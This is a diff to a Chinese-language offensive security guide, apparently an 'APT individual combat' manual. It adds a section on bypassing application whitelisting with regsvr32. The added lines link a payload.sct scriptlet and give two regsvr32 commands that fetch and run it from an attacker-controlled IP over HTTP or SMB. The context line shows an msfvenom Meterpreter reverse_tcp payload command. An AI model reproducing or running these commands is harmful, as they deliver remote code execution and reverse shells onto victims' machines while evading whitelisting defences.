@@ -276,3 +276,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=443 -x hi.e
 ### 自解压
 
 ## 白名单
+
+### regsvr32
+
+[payload.sct](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E7%99%BD%E5%90%8D%E5%8D%95/payload.sct)
+
+```bash
+regsvr32 /u /n /s /i:http://IP地址/payload/white/payload.sct scrobj.dll
+regsvr32 /u /n /s /i:\\IP地址\payload\white\payload.sct scrobj.dll
+```
